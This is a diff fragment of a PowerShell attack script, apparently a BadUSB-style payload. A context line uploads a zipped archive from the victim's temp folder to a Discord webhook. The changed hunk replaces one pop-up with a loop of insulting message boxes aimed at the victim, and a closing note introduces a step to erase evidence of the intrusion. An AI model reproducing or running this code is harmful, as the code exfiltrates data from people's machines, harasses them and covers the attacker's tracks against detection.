@@ -559,41 +559,28 @@ if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:tmp/$ZIP"}
 
 ############################################################################################################################################################
 
-MsgBox -m 'nice try!' -t "move in silence" -b OKCancel -i Warning
+Add-Type -AssemblyName System.Windows.Forms
 
-function MsgBox {
+# The number of times you want it to cycle through your list of questions
 
-[CmdletBinding()]
-param (	
-[Parameter (Mandatory = $True)]
-[Alias("m")]
-[string]$message,
+$cycles = 3
 
-[Parameter (Mandatory = $False)]
-[Alias("t")]
-[string]$title,
+# List as many questions here as you like, it will cycle through all of them
 
-[Parameter (Mandatory = $False)]
-[Alias("b")]
-[ValidateSet('OK','OKCancel','YesNoCancel','YesNo')]
-[string]$button,
-
-[Parameter (Mandatory = $False)]
-[Alias("i")]
-[ValidateSet('None','Hand','Question','Warning','Asterisk')]
-[string]$image
+$msgs = @(
+"How fucking dumb are you?"
+"Are your parents proud?"
 )
 
-Add-Type -AssemblyName PresentationCore,PresentationFramework
+for ($i=1; $i -le $cycles; $i++) {
 
-if (!$title) {$title = " "}
-if (!$button) {$button = "OK"}
-if (!$image) {$image = "None"}
-
-[System.Windows.MessageBox]::Show($message,$title,$button,$image)
-
+Foreach ($msg in $msgs) {
+[System.Windows.Forms.MessageBox]::Show($msg , "You're-a-Loser.exe" , 4 , 'Question')
 }
+}
+
 ############################################################################################################################################################
+
 <#
 .NOTES 
 	This is to clean up behind you and remove any evidence to prove you were there
